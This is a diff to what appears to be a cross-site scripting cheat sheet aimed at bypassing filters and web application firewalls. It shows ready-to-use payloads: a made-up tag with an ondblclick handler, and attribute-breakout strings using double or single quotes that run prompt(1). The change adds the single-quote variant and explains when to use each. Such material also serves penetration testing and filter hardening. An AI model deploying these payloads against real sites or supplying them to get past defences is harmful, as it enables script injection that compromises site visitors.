@@ -16,9 +16,10 @@ Did they block onerror onload onclick? It is important to remember that the basi
 ```html
 <XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
 ```
-If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " in your injection.
+If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " or ' in your injection depending on the developer's choice for the attribute you are breaking.
 ```html
 " onclick="prompt(1)
+' onclick='prompt(1)
 ```
 WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also (Just remember IE vs Firefox and HTML5 support.
 ```html
